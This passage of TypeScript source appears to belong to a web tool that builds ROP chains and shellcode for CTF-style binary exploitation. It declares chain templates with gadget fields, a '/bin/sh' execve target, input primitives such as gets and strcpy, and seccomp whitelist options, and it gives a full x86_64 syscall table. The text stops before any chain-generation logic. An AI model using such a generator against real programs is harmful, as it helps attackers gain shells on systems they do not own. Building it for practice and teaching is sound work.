// TypeScript source. Build app.js with npm run build; do not edit generated output.
type Architecture = "amd64" | "i386";
type RopTemplate = "41" | "42" | "43" | "41a" | "42a";
type InputPrimitive = "unknown" | "gets" | "strcpy" | "read-fixed" | "read-stream";
interface Syscall { nr: number; name: string; args: string[]; }
type RawSyscall = [nr: number, name: string, signature: string];
type NumberEntry = [nr: number, name: string];
type Hint = [kind: string, explanation: string, suggestions: string[]];
interface ChainStep {
  name: string; nr: number | null; code: string; rax: string;
  isSave?: boolean; vals?: string[]; strVal?: string; displayName?: string;
}
interface MultiString { idx: number[]; def: string[]; }
// Keep these ID-to-element types aligned with index.html.
interface UiElements {
  "themeToggle": HTMLButtonElement;
  "subLine": HTMLElement;
  "archAmd": HTMLButtonElement;
  "archI386": HTMLButtonElement;
  "q": HTMLInputElement;
  "suggest": HTMLElement;
  "quick": HTMLElement;
  "i386Note": HTMLElement;
  "tableNote": HTMLElement;
  "detailCard": HTMLElement;
  "sysName": HTMLElement;
  "sysNr": HTMLElement;
  "sysProto": HTMLElement;
  "regMap": HTMLElement;
  "warnBox": HTMLElement;
  "strBox": HTMLElement;
  "strLabel": HTMLElement;
  "strInput": HTMLInputElement;
  "strBox2": HTMLElement;
  "strLabel2": HTMLElement;
  "strInput2": HTMLInputElement;
  "strBox3": HTMLElement;
  "strLabel3": HTMLElement;
  "strInput3": HTMLInputElement;
  "argsBox": HTMLElement;
  "genCode": HTMLElement;
  "wlWarn": HTMLElement;
  "copyBtn": HTMLButtonElement;
  "addChainBtn": HTMLButtonElement;
  "asmBtn": HTMLButtonElement;
  "asmPreview": HTMLElement;
  "asmNote": HTMLElement;
  "wlInput": HTMLInputElement;
  "wlGenBtn": HTMLButtonElement;
  "wlGenResult": HTMLElement;
  "wlStatus": HTMLElement;
  "wlWriteFd": HTMLInputElement;
  "wlOpenName": HTMLInputElement;
  "wlReadFd": HTMLInputElement;
  "wlExecBan": HTMLInputElement;
  "paramStatus": HTMLElement;
  "presetMmap": HTMLButtonElement;
  "presetOrw": HTMLButtonElement;
  "clearChain": HTMLButtonElement;
  "chainBox": HTMLElement;
  "chainOut": HTMLElement;
  "chainCode": HTMLElement;
  "copyChainBtn": HTMLButtonElement;
  "ropT41": HTMLButtonElement;
  "ropT42": HTMLButtonElement;
  "ropT43": HTMLButtonElement;
  "ropT41a": HTMLButtonElement;
  "ropT42a": HTMLButtonElement;
  "ropPrimGets": HTMLButtonElement;
  "ropPrimStrcpy": HTMLButtonElement;
  "ropPrimReadFix": HTMLButtonElement;
  "ropPrimReadStream": HTMLButtonElement;
  "ropPrimUnknown": HTMLButtonElement;
  "ropPrimNote": HTMLElement;
  "ropCond": HTMLElement;
  "ropPreset41": HTMLButtonElement;
  "ropPreset42": HTMLButtonElement;
  "ropPreset43": HTMLButtonElement;
  "ropPreset41a": HTMLButtonElement;
  "ropPreset42a": HTMLButtonElement;
  "ropOffset": HTMLInputElement;
  "ropDelay": HTMLInputElement;
  "rop42Str": HTMLInputElement;
  "ropG41": HTMLElement;
  "rop41PopEax": HTMLInputElement;
  "rop41Pop3": HTMLInputElement;
  "rop41Int80": HTMLInputElement;
  "rop41Bss": HTMLInputElement;
  "rop41Len": HTMLInputElement;
  "ropG42": HTMLElement;
  "rop42Binsh": HTMLInputElement;
  "rop42PopEax": HTMLInputElement;
  "rop42Pop3": HTMLInputElement;
  "rop42Mov": HTMLInputElement;
  "rop42Int80": HTMLInputElement;
  "ropG43": HTMLElement;
  "rop43PopRax": HTMLInputElement;
  "rop43PopRdi": HTMLInputElement;
  "rop43PopRsi": HTMLInputElement;
  "rop43PopRdx": HTMLInputElement;
  "rop43Syscall": HTMLInputElement;
  "rop43Binsh": HTMLInputElement;
  "ropG41a": HTMLElement;
  "rop41aPopRax": HTMLInputElement;
  "rop41aPopRdi": HTMLInputElement;
  "rop41aPopRsi": HTMLInputElement;
  "rop41aPopRdx": HTMLInputElement;
  "rop41aSyscall": HTMLInputElement;
  "rop41aBss": HTMLInputElement;
  "rop41aLen": HTMLInputElement;
  "ropG42a": HTMLElement;
  "rop42aBinsh": HTMLInputElement;
  "rop42aPopRax": HTMLInputElement;
  "rop42aPopRdi": HTMLInputElement;
  "rop42aMov": HTMLInputElement;
  "rop42aPopRsi": HTMLInputElement;
  "rop42aPopRdx": HTMLInputElement;
  "rop42aSyscall": HTMLInputElement;
  "ropSteps": HTMLElement;
  "ropCode": HTMLElement;
  "ropWarn": HTMLElement;
  "ropCopyBtn": HTMLButtonElement;
  "quizBox": HTMLElement;
  "toast": HTMLElement;
}

// 数据：[NR, name, "arg0|arg1|..."]，arg 为表中原文（类型+名），"-" 表示无
// 字面顺序不保证按号升序，SYS 已排序（L761 按 nr 重排），查表/生成都以 SYS 为准；不要为排字面冒风险重排。
var RAW: RawSyscall[] =[
[0,"read","unsigned int fd|char *buf|size_t count"],
[1,"write","unsigned int fd|const char *buf|size_t count"],
[2,"open","const char *filename|int flags|umode_t mode"],
[3,"close","unsigned int fd"],
[4,"stat","const char *filename|struct stat *statbuf"],
[5,"fstat","unsigned int fd|struct stat *statbuf"],
[6,"lstat","const char *filename|struct stat *statbuf"],
[7,"poll","struct pollfd *ufds|unsigned int nfds|int timeout_msecs"],
[8,"lseek","unsigned int fd|off_t offset|unsigned int whence"],
[9,"mmap","unsigned long addr|unsigned long len|unsigned long prot|unsigned long flags|unsigned long fd|unsigned long off"],
[10,"mprotect","unsigned long start|size_t len|unsigned long prot"],
[11,"munmap","unsigned long addr|size_t len"],
[12,"brk","unsigned long brk"],
[13,"rt_sigaction","int sig|const struct sigaction *act|struct sigaction *oact|size_t sigsetsize"],
[14,"rt_sigprocmask","int how|sigset_t *nset|sigset_t *oset|size_t sigsetsize"],
[15,"rt_sigreturn",""],
[16,"ioctl","unsigned int fd|unsigned int cmd|unsigned long arg"],
[17,"pread64","unsigned int fd|char *buf|size_t count|loff_t pos"],
[18,"pwrite64","unsigned int fd|const char *buf|size_t count|loff_t pos"],
[19,"readv","unsigned long fd|const struct iovec *vec|unsigned long vlen"],
[20,"writev","unsigned long fd|const struct iovec *vec|unsigned long vlen"],
[21,"access","const char *filename|int mode"],
[22,"pipe","int *fildes"],
[23,"select","int n|fd_set *inp|fd_set *outp|fd_set *exp|struct timeval *tvp"],
[24,"sched_yield",""],
[25,"mremap","unsigned long addr|unsigned long old_len|unsigned long new_len|unsigned long flags|unsigned long new_addr"],
[26,"msync","unsigned long start|size_t len|int flags"],
[27,"mincore","unsigned long start|size_t len|unsigned char *vec"],
[28,"madvise","unsigned long start|size_t len|int behavior"],
[29,"shmget","key_t key|size_t size|int flag"],
[30,"shmat","int shmid|char *shmaddr|int shmflg"],
[31,"shmctl","int shmid|int cmd|struct shmid_ds *buf"],
[32,"dup","unsigned int fildes"],
[33,"dup2","unsigned int oldfd|unsigned int newfd"],
[34,"pause",""],
[35,"nanosleep","struct timespec *rqtp|struct timespec *rmtp"],
[37,"alarm","unsigned int seconds"],
[39,"getpid",""],
[40,"sendfile","int out_fd|int in_fd|loff_t *offset|size_t count"],
[41,"socket","int family|int type|int protocol"],
[42,"connect","int fd|struct sockaddr *uservaddr|int addrlen"],
[43,"accept","int fd|struct sockaddr *upeer_sockaddr|int *upeer_addrlen"],
[44,"sendto","int fd|void *buff|size_t len|unsigned int flags|struct sockaddr *addr|int addr_len"],
[45,"recvfrom","int fd|void *ubuf|size_t size|unsigned int flags|struct sockaddr *addr|int *addr_len"],
[46,"sendmsg","int fd|struct user_msghdr *msg|unsigned int flags"],
[47,"recvmsg","int fd|struct user_msghdr *msg|unsigned int flags"],
[48,"shutdown","int fd|int how"],
[49,"bind","int fd|struct sockaddr *umyaddr|int addrlen"],
[50,"listen","int fd|int backlog"],
[51,"getsockname","int fd|struct sockaddr *usockaddr|int *usockaddr_len"],
[52,"getpeername","int fd|struct sockaddr *usockaddr|int *usockaddr_len"],
[53,"socketpair","int family|int type|int protocol|int *usockvec"],
[54,"setsockopt","int fd|int level|int optname|char *optval|int optlen"],
[55,"getsockopt","int fd|int level|int optname|char *optval|int *optlen"],
[56,"clone","unsigned long clone_flags|unsigned long newsp|int *parent_tidptr|int *child_tidptr|unsigned long tls"],
[57,"fork",""],[58,"vfork",""],
[59,"execve","const char *filename|const char *const *argv|const char *const *envp"],
[60,"exit","int error_code"],
[61,"wait4","pid_t pid|int *stat_addr|int options|struct rusage *ru"],
[62,"kill","pid_t pid|int sig"],
[63,"uname","struct new_utsname *name"],
[72,"fcntl","unsigned int fd|unsigned int cmd|unsigned long arg"],
[73,"flock","unsigned int fd|unsigned int cmd"],
[74,"fsync","unsigned int fd"],[75,"fdatasync","unsigned int fd"],
[76,"truncate","const char *path|long length"],
[77,"ftruncate","unsigned int fd|off_t length"],
[78,"getdents","unsigned int fd|struct linux_dirent *dirent|unsigned int count"],
[79,"getcwd","char *buf|unsigned long size"],
[80,"chdir","const char *filename"],[81,"fchdir","unsigned int fd"],
[82,"rename","const char *oldname|const char *newname"],
[83,"mkdir","const char *pathname|umode_t mode"],
[84,"rmdir","const char *pathname"],
[85,"creat","const char *pathname|umode_t mode"],
[86,"link","const char *oldname|const char *newname"],
[87,"unlink","const char *pathname"],
[88,"symlink","const char *old|const char *new"],
[89,"readlink","const char *path|char *buf|int bufsiz"],
[90,"chmod","const char *filename|umode_t mode"],
[91,"fchmod","unsigned int fd|umode_t mode"],
[95,"umask","int mask"],
[96,"gettimeofday","struct timeval *tv|struct timezone *tz"],
[97,"getrlimit","unsigned int resource|struct rlimit *rlim"],
[101,"ptrace","long request|long pid|unsigned long addr|unsigned long data"],
[102,"getuid",""],[104,"getgid",""],[105,"setuid","uid_t uid"],[106,"setgid","gid_t gid"],
[107,"geteuid",""],[108,"getegid",""],[110,"getppid",""],
[131,"sigaltstack","const stack_t *uss|stack_t *uoss"],
[137,"statfs","const char *path|struct statfs *buf"],
[158,"arch_prctl","int option|unsigned long arg2"],
[160,"setrlimit","unsigned int resource|struct rlimit *rlim"],
[161,"chroot","const char *filename"],[162,"sync",""],
[165,"mount","char *dev_name|char *dir_name|char *type|unsigned long flags|void *data"],
[166,"umount2","char *name|int flags"],
[169,"reboot","int magic1|int magic2|unsigned int cmd|void *arg"],
[186,"gettid",""],
[187,"readahead","int fd|loff_t offset|size_t count"],
[200,"tkill","pid_t pid|int sig"],
[201,"time","time_t *tloc"],
[202,"futex","u32 *uaddr|int op|u32 val|const struct timespec *utime|u32 *uaddr2|u32 val3"],
[213,"epoll_create","int size"],
[217,"getdents64","unsigned int fd|struct linux_dirent64 *dirent|unsigned int count"],
[218,"set_tid_address","int *tidptr"],[219,"restart_syscall",""],
[231,"exit_group","int error_code"],
[232,"epoll_wait","int epfd|struct epoll_event *events|int maxevents|int timeout"],
[233,"epoll_ctl","int epfd|int op|int fd|struct epoll_event *event"],
[234,"tgkill","pid_t tgid|pid_t pid|int sig"],
[257,"openat","int dfd|const char *filename|int flags|umode_t mode"],
[258,"mkdirat","int dfd|const char *pathname|umode_t mode"],
[262,"newfstatat","int dfd|const char *filename|struct stat *statbuf|int flag"],
[263,"unlinkat","int dfd|const char *pathname|int flag"],
[264,"renameat","int olddfd|const char *oldname|int newdfd|const char *newname"],
[267,"readlinkat","int dfd|const char *path|char *buf|int bufsiz"],
[269,"faccessat","int dfd|const char *filename|int mode"],
[271,"ppoll","struct pollfd *ufds|unsigned int nfds|struct timespec *tsp|const sigset_t *sigmask|size_t sigsetsize"],
[272,"unshare","unsigned long unshare_flags"],
[275,"splice","int fd_in|loff_t *off_in|int fd_out|loff_t *off_out|size_t len|unsigned int flags"],
[281,"epoll_pwait","int epfd|struct epoll_event *events|int maxevents|int timeout|const sigset_t *sigmask|size_t sigsetsize"],
[282,"signalfd","int ufd|sigset_t *user_mask|size_t sizemask"],
[284,"eventfd","unsigned int initval"],
[285,"fallocate","int fd|int mode|loff_t offset|loff_t len"],
[288,"accept4","int fd|struct sockaddr *upeer_sockaddr|int *upeer_addrlen|int flags"],
[291,"epoll_create1","int flags"],
[292,"dup3","unsigned int oldfd|unsigned int newfd|int flags"],
[293,"pipe2","int *fildes|int flags"],
[294,"inotify_init1","int flags"],
[295,"preadv","unsigned long fd|const struct iovec *vec|unsigned long vlen|unsigned long pos_l|unsigned long pos_h"],
[296,"pwritev","unsigned long fd|const struct iovec *vec|unsigned long vlen|unsigned long pos_l|unsigned long pos_h"],
[302,"prlimit64","pid_t pid|unsigned int resource|const struct rlimit64 *new_rlim|struct rlimit64 *old_rlim"],
[304,"open_by_handle_at","int mountdirfd|struct file_handle *handle|int flags"],
[306,"syncfs","int fd"],
[307,"sendmmsg","int fd|struct mmsghdr *mmsg|unsigned int vlen|unsigned int flags"],
[308,"setns","int fd|int nstype"],
[310,"process_vm_readv","pid_t pid|const struct iovec *lvec|unsigned long liovcnt|const struct iovec *rvec|unsigned long riovcnt|unsigned long flags"],
[311,"process_vm_writev","pid_t pid|const struct iovec *lvec|unsigned long liovcnt|const struct iovec *rvec|unsigned long riovcnt|unsigned long flags"],
[313,"finit_module","int fd|const char *uargs|int flags"],
[316,"renameat2","int olddfd|const char *oldname|int newdfd|const char *newname|unsigned int flags"],
[317,"seccomp","unsigned int op|unsigned int flags|void *uargs"],
[318,"getrandom","char *buf|size_t count|unsigned int flags"],
[319,"memfd_create","const char *uname_ptr|unsigned int flags"],
[322,"execveat","int dfd|const char *filename|const char *const *argv|const char *const *envp|int flags"],
[435,"clone3","struct clone_args *uargs|size_t size"],
[437,"openat2","int dfd|const char *filename|struct open_how *how|size_t size"],
[36,"getitimer","int which|struct itimerval *value"],
[38,"setitimer","int which|struct itimerval *value|struct itimerval *ovalue"],
[64,"semget","key_t key|int nsems|int semflg"],
[65,"semop","int semid|struct sembuf *sops|unsigned nsops"],
[66,"semctl","int semid|int semnum|int cmd|unsigned long arg"],
[67,"shmdt","char *shmaddr"],
[68,"msgget","key_t key|int msgflg"],
[69,"msgsnd","int msqid|struct msgbuf *msgp|size_t msgsz|int msgflg"],
[70,"msgrcv","int msqid|struct msgbuf *msgp|size_t msgsz|long msgtyp|int msgflg"],
[71,"msgctl","int msqid|int cmd|struct msqid_ds *buf"],
[92,"chown","const char *filename|uid_t user|gid_t group"],
[93,"fchown","unsigned int fd|uid_t user|gid_t group"],
[94,"lchown","const char *filename|uid_t user|gid_t group"],
[98,"getrusage","int who|struct rusage *ru"],
[99,"sysinfo","struct sysinfo *info"],
[100,"times","struct tms *tbuf"],
[103,"syslog","int type|char *buf|int len"],
[109,"setpgid","pid_t pid|pid_t pgid"],
[111,"getpgrp",""],
[112,"setsid",""],
[113,"setreuid","uid_t ruid|uid_t euid"],
[114,"setregid","gid_t rgid|gid_t egid"],
[115,"getgroups","int gidsetsize|gid_t *grouplist"],
[116,"setgroups","int gidsetsize|gid_t *grouplist"],
[117,"setresuid","uid_t ruid|uid_t euid|uid_t suid"],
[118,"getresuid","uid_t *ruid|uid_t *euid|uid_t *suid"],
[119,"setresgid","gid_t rgid|gid_t egid|gid_t sgid"],
[120,"getresgid","gid_t *rgid|gid_t *egid|gid_t *sgid"],
[121,"getpgid","pid_t pid"],
[122,"setfsuid","uid_t uid"],
[123,"setfsgid","gid_t gid"],
[124,"getsid","pid_t pid"],
[125,"capget","cap_user_header_t header|cap_user_data_t dataptr"],
[126,"capset","cap_user_header_t header|const cap_user_data_t data"],
[127,"rt_sigpending","sigset_t *uset|size_t sigsetsize"],
[128,"rt_sigtimedwait","const sigset_t *uthese|siginfo_t *uinfo|const struct timespec *uts|size_t sigsetsize"],
[129,"rt_sigqueueinfo","pid_t pid|int sig|siginfo_t *uinfo"],
[130,"rt_sigsuspend","sigset_t *unewset|size_t sigsetsize"],
[132,"utime","char *filename|struct utimbuf *times"],
[133,"mknod","const char *filename|umode_t mode|unsigned dev"],
[135,"personality","unsigned int personality"],
[136,"ustat","unsigned dev|struct ustat *ubuf"],
[138,"fstatfs","unsigned int fd|struct statfs *buf"],
[139,"sysfs","int option|unsigned long arg1|unsigned long arg2"],
[140,"getpriority","int which|int who"],
[141,"setpriority","int which|int who|int niceval"],
[142,"sched_setparam","pid_t pid|struct sched_param *param"],
[143,"sched_getparam","pid_t pid|struct sched_param *param"],
[144,"sched_setscheduler","pid_t pid|int policy|struct sched_param *param"],
[145,"sched_getscheduler","pid_t pid"],
[146,"sched_get_priority_max","int policy"],
[147,"sched_get_priority_min","int policy"],
[148,"sched_rr_get_interval","pid_t pid|struct timespec *interval"],
[149,"mlock","unsigned long start|size_t len"],
[150,"munlock","unsigned long start|size_t len"],
[151,"mlockall","int flags"],
[152,"munlockall",""],
[153,"vhangup",""],
[154,"modify_ldt","int func|void *ptr|unsigned long bytecount"],
[155,"pivot_root","const char *new_root|const char *put_old"],
[157,"prctl","int option|unsigned long arg2|unsigned long arg3|unsigned long arg4|unsigned long arg5"],
[159,"adjtimex","struct timex *txc_p"],
[163,"acct","const char *name"],
[164,"settimeofday","struct timeval *tv|struct timezone *tz"],
[167,"swapon","const char *specialfile|int swap_flags"],
[168,"swapoff","const char *specialfile"],
[170,"sethostname","char *name|int len"],
[171,"setdomainname","char *name|int len"],
[172,"iopl","unsigned int level"],
[173,"ioperm","unsigned long from|unsigned long num|int turn_on"],
[175,"init_module","void *umod|unsigned long len|const char *uargs"],
[176,"delete_module","const char *name_user|unsigned int flags"],
[179,"quotactl","unsigned int cmd|const char *special|qid_t id|void *addr"],
[188,"setxattr","const char *path|const char *name|const void *value|size_t size|int flags"],
[189,"lsetxattr","const char *path|const char *name|const void *value|size_t size|int flags"],
[190,"fsetxattr","int fd|const char *name|const void *value|size_t size|int flags"],
[191,"getxattr","const char *path|const char *name|void *value|size_t size"],
[192,"lgetxattr","const char *path|const char *name|void *value|size_t size"],
[193,"fgetxattr","int fd|const char *name|void *value|size_t size"],
[194,"listxattr","const char *path|char *list|size_t size"],
[195,"llistxattr","const char *path|char *list|size_t size"],
[196,"flistxattr","int fd|char *list|size_t size"],
[197,"removexattr","const char *path|const char *name"],
[198,"lremovexattr","const char *path|const char *name"],
[199,"fremovexattr","int fd|const char *name"],
[203,"sched_setaffinity","pid_t pid|unsigned int len|unsigned long *user_mask_ptr"],
[204,"sched_getaffinity","pid_t pid|unsigned int len|unsigned long *user_mask_ptr"],
[206,"io_setup","unsigned nr_events|aio_context_t *ctxp"],
[207,"io_destroy","aio_context_t ctx"],
[208,"io_getevents","aio_context_t ctx_id|long min_nr|long nr|struct io_event *events|struct timespec *timeout"],
[209,"io_submit","aio_context_t ctx_id|long nr|struct iocb * *iocbpp"],
[210,"io_cancel","aio_context_t ctx_id|struct iocb *iocb|struct io_event *result"],
[216,"remap_file_pages","unsigned long start|unsigned long size|unsigned long prot|unsigned long pgoff|unsigned long flags"],
[220,"semtimedop","int semid|struct sembuf *sops|unsigned nsops|const struct timespec *timeout"],
[221,"fadvise64","int fd|loff_t offset|size_t len|int advice"],
[222,"timer_create","clockid_t which_clock|struct sigevent *timer_event_spec|timer_t *created_timer_id"],
[223,"timer_settime","timer_t timer_id|int flags|const struct itimerspec *new_setting|struct itimerspec *old_setting"],
[224,"timer_gettime","timer_t timer_id|struct itimerspec *setting"],
[225,"timer_getoverrun","timer_t timer_id"],
[226,"timer_delete","timer_t timer_id"],
[227,"clock_settime","clockid_t which_clock|const struct timespec *tp"],
[228,"clock_gettime","clockid_t which_clock|struct timespec *tp"],
[229,"clock_getres","clockid_t which_clock|struct timespec *tp"],
[230,"clock_nanosleep","clockid_t which_clock|int flags|const struct timespec *rqtp|struct timespec *rmtp"],
[235,"utimes","char *filename|struct timeval *utimes"],
[237,"mbind","unsigned long start|unsigned long len|unsigned long mode|const unsigned long *nmask|unsigned long maxnode|unsigned flags"],
[238,"set_mempolicy","int mode|const unsigned long *nmask|unsigned long maxnode"],
[239,"get_mempolicy","int *policy|unsigned long *nmask|unsigned long maxnode|unsigned long addr|unsigned long flags"],
[240,"mq_open","const char *name|int oflag|umode_t mode|struct mq_attr *attr"],
[241,"mq_unlink","const char *name"],
[242,"mq_timedsend","mqd_t mqdes|const char *msg_ptr|size_t msg_len|unsigned int msg_prio|const struct timespec *abs_timeout"],
[243,"mq_timedreceive","mqd_t mqdes|char *msg_ptr|size_t msg_len|unsigned int *msg_prio|const struct timespec *abs_timeout"],
[244,"mq_notify","mqd_t mqdes|const struct sigevent *notification"],
[245,"mq_getsetattr","mqd_t mqdes|const struct mq_attr *mqstat|struct mq_attr *omqstat"],
[246,"kexec_load","unsigned long entry|unsigned long nr_segments|struct kexec_segment *segments|unsigned long flags"],
[247,"waitid","int which|pid_t pid|struct siginfo *infop|int options|struct rusage *ru"],
[248,"add_key","const char *_type|const char *_description|const void *_payload|size_t plen|key_serial_t destringid"],
[249,"request_key","const char *_type|const char *_description|const char *_callout_info|key_serial_t destringid"],
[250,"keyctl","int cmd|unsigned long arg2|unsigned long arg3|unsigned long arg4|unsigned long arg5"],
[251,"ioprio_set","int which|int who|int ioprio"],
[252,"ioprio_get","int which|int who"],
[253,"inotify_init",""],
[254,"inotify_add_watch","int fd|const char *path|u32 mask"],
[255,"inotify_rm_watch","int fd|int wd"],
[256,"migrate_pages","pid_t pid|unsigned long maxnode|const unsigned long *from|const unsigned long *to"],
[259,"mknodat","int dfd|const char *filename|umode_t mode|unsigned dev"],
[260,"fchownat","int dfd|const char *filename|uid_t user|gid_t group|int flag"],
[261,"futimesat","int dfd|const char *filename|struct timeval *utimes"],
[265,"linkat","int olddfd|const char *oldname|int newdfd|const char *newname|int flags"],
[266,"symlinkat","const char *oldname|int newdfd|const char *newname"],
[268,"fchmodat","int dfd|const char *filename|umode_t mode"],
[270,"pselect6","int n|fd_set *inp|fd_set *outp|fd_set *exp|struct timespec *tsp|void *sig"],
[273,"set_robust_list","struct robust_list_head *head|size_t len"],
[274,"get_robust_list","int pid|struct robust_list_head * *head_ptr|size_t *len_ptr"],
[276,"tee","int fdin|int fdout|size_t len|unsigned int flags"],
[277,"sync_file_range","int fd|loff_t offset|loff_t nbytes|unsigned int flags"],
[278,"vmsplice","int fd|const struct iovec *iov|unsigned long nr_segs|unsigned int flags"],
[279,"move_pages","pid_t pid|unsigned long nr_pages|const void * *pages|const int *nodes|int *status|int flags"],
[280,"utimensat","int dfd|const char *filename|struct timespec *utimes|int flags"],
[283,"timerfd_create","int clockid|int flags"],
[286,"timerfd_settime","int ufd|int flags|const struct itimerspec *utmr|struct itimerspec *otmr"],
[287,"timerfd_gettime","int ufd|struct itimerspec *otmr"],
[289,"signalfd4","int ufd|sigset_t *user_mask|size_t sizemask|int flags"],
[290,"eventfd2","unsigned int initval|int flags"],
[297,"rt_tgsigqueueinfo","pid_t tgid|pid_t pid|int sig|siginfo_t *uinfo"],
[298,"perf_event_open","struct perf_event_attr *attr_uptr|pid_t pid|int cpu|int group_fd|unsigned long flags"],
[299,"recvmmsg","int fd|struct mmsghdr *mmsg|unsigned int vlen|unsigned int flags|struct timespec *timeout"],
[300,"fanotify_init","unsigned int flags|unsigned int event_f_flags"],
[301,"fanotify_mark","int fanotify_fd|unsigned int flags|u64 mask|int fd|const char *pathname"],
[303,"name_to_handle_at","int dfd|const char *name|struct file_handle *handle|void *mnt_id|int flag"],
[305,"clock_adjtime","clockid_t which_clock|struct timex *tx"],
[309,"getcpu","unsigned *cpup|unsigned *nodep|void *unused"],
[312,"kcmp","pid_t pid1|pid_t pid2|int type|unsigned long idx1|unsigned long idx2"],
[314,"sched_setattr","pid_t pid|struct sched_attr *attr|unsigned int flags"],
[315,"sched_getattr","pid_t pid|struct sched_attr *attr|unsigned int size|unsigned int flags"],
[320,"kexec_file_load","int kernel_fd|int initrd_fd|unsigned long cmdline_len|const char *cmdline_ptr|unsigned long flags"],
[321,"bpf","int cmd|union bpf_attr *attr|unsigned int size"],
[323,"userfaultfd","int flags"],
[324,"membarrier","int cmd|unsigned int flags|int cpu_id"],
[325,"mlock2","unsigned long start|size_t len|int flags"],
[326,"copy_file_range","int fd_in|loff_t *off_in|int fd_out|loff_t *off_out|size_t len|unsigned int flags"],
[327,"preadv2","unsigned long fd|const struct iovec *vec|unsigned long vlen|unsigned long pos_l|unsigned long pos_h|rwf_t flags"],
[328,"pwritev2","unsigned long fd|const struct iovec *vec|unsigned long vlen|unsigned long pos_l|unsigned long pos_h|rwf_t flags"],
[329,"pkey_mprotect","unsigned long start|size_t len|unsigned long prot|int pkey"],
[330,"pkey_alloc","unsigned long flags|unsigned long init_val"],
[331,"pkey_free","int pkey"],
[332,"statx","int dfd|const char *path|unsigned flags|unsigned mask|struct statx *buffer"],
[333,"io_pgetevents","aio_context_t ctx_id|long min_nr|long nr|struct io_event *events|struct timespec *timeout|const struct aio_sigset *usig"],
[334,"rseq","struct rseq *rseq|uint32_t rseq_len|int flags|uint32_t sig"],
[335,"uretprobe",""],
[336,"uprobe",""],
[424,"pidfd_send_signal","int pidfd|int sig|siginfo_t *info|unsigned int flags"],
[425,"io_uring_setup","u32 entries|struct io_uring_params *p"],
[426,"io_uring_enter","unsigned int fd|u32 to_submit|u32 min_complete|u32 flags|const void *argp|size_t argsz"],
[427,"io_uring_register","unsigned int fd|unsigned int op|void *arg|unsigned int nr_args"],
[428,"open_tree","int dfd|const char *path|unsigned flags"],
[429,"move_mount","int from_dfd|const char *from_path|int to_dfd|const char *to_path|unsigned int ms_flags"],
[430,"fsopen","const char *fs_name|unsigned int flags"],
[431,"fsconfig","int fs_fd|unsigned int cmd|const char *key|const void *value|int aux"],
[432,"fsmount","int fs_fd|unsigned int flags|unsigned int ms_flags"],
[433,"fspick","int dfd|const char *path|unsigned int flags"],
[434,"pidfd_open","pid_t pid|unsigned int flags"],
[436,"close_range","unsigned int fd|unsigned int max_fd|unsigned int flags"],
[438,"pidfd_getfd","int pidfd|int fd|unsigned int flags"],
[439,"faccessat2","int dfd|const char *filename|int mode|int flags"],
[440,"process_madvise","int pidfd|const struct iovec *vec|size_t vlen|int behavior|unsigned int flags"],
[441,"epoll_pwait2","int epfd|struct epoll_event *events|int maxevents|const struct timespec *timeout|const sigset_t *sigmask|size_t sigsetsize"],
[442,"mount_setattr","int dfd|const char *path|unsigned int flags|struct mount_attr *uattr|size_t usize"],
[443,"quotactl_fd","unsigned int fd|unsigned int cmd|qid_t id|void *addr"],
[444,"landlock_create_ruleset","const struct landlock_ruleset_attr *attr|size_t size|u32 flags"],
[445,"landlock_add_rule","int ruleset_fd|enum landlock_rule_type rule_type|const void *rule_attr|u32 flags"],
[446,"landlock_restrict_self","int ruleset_fd|u32 flags"],
[447,"memfd_secret","unsigned int flags"],
[448,"process_mrelease","int pidfd|unsigned int flags"],
[449,"futex_waitv","struct futex_waitv *waiters|unsigned int nr_futexes|unsigned int flags|struct timespec *timeout|clockid_t clockid"],
[450,"set_mempolicy_home_node","unsigned long start|unsigned long len|unsigned long home_node|unsigned long flags"],
[451,"cachestat","unsigned int fd|struct cachestat_range *cstat_range|struct cachestat *cstat|unsigned int flags"],
[452,"fchmodat2","int dfd|const char *filename|umode_t mode|unsigned int flags"],
[453,"map_shadow_stack","unsigned long addr|unsigned long size|unsigned int flags"],
[454,"futex_wake","void *uaddr|unsigned long mask|int nr|unsigned int flags"],
[455,"futex_wait","void *uaddr|unsigned long val|unsigned long mask|unsigned int flags|struct timespec *timespec|clockid_t clockid"],
[456,"futex_requeue","struct futex_waitv *waiters|unsigned int flags|int nr_wake|int nr_requeue"],
[457,"statmount","const struct mnt_id_req *req|struct statmount *buf|size_t bufsize|unsigned int flags"],
[458,"listmount","const struct mnt_id_req *req|u64 *mnt_ids|size_t nr_mnt_ids|unsigned int flags"],
[459,"lsm_get_self_attr","unsigned int attr|struct lsm_ctx *ctx|u32 *size|u32 flags"],
[460,"lsm_set_self_attr","unsigned int attr|struct lsm_ctx *ctx|u32 size|u32 flags"],
[461,"lsm_list_modules","u64 *ids|u32 *size|u32 flags"],
[462,"mseal","unsigned long start|size_t len|unsigned long flags"],
[463,"setxattrat","int dfd|const char *path|unsigned int at_flags|const char *name|const struct xattr_args *args|size_t size"],
[464,"getxattrat","int dfd|const char *path|unsigned int at_flags|const char *name|struct xattr_args *args|size_t size"],
[465,"listxattrat","int dfd|const char *path|unsigned int at_flags|char *list|size_t size"],
[466,"removexattrat","int dfd|const char *path|unsigned int at_flags|const char *name"],
[467,"open_tree_attr","int dfd|const char *path|unsigned flags|struct mount_attr *uattr|size_t usize"],
[468,"file_getattr","int dfd|const char *filename|struct file_attr *attr|size_t usize|unsigned int at_flags"],
[469,"file_setattr","int dfd|const char *filename|struct file_attr *attr|size_t usize|unsigned int at_flags"],
[470,"listns","const struct ns_id_req *req|u64 *ns_ids|size_t nr_ns_ids|unsigned int flags"],
[471,"rseq_slice_yield",""],
[472,"fchroot","int fd|unsigned int flags"],
];
var REGS=["rdi","rsi","rdx","r10","r8","r9"];
var REGNAMES=["rax","rbx","rcx","rdx","rsi","rdi","rbp","rsp","r8","r9","r10","r11","r12","r13","r14","r15","eax","ebx","ecx","edx","esi","edi","esp","ebp"];
var SYS: Syscall[] = RAW.map(function(r){return {nr:r[0],name:r[1],args:r[2]?r[2].split("|"):[]};}).sort(function(a,b){return a.nr-b.nr;});
var SYS64 = SYS;
// ===== i386：调用号与寄存器和 x64 完全不同（走 int 0x80）。参数签名按同名 x64 调用复用，个别单独覆盖。 =====
var arch: Architecture = "amd64";
var ARG64: Record<string, string[]> = {}; SYS64.forEach(function(s){ARG64[s.name]=s.args;});
var ARGS32: Record<string, string> = {
 "mmap2":"unsigned long addr|unsigned long len|unsigned long prot|unsigned long flags|int fd|unsigned long pgoff",
 "waitpid":"pid_t pid|int *stat_addr|int options",
 "umount":"char *name",
 "socketcall":"int call|unsigned long *args",
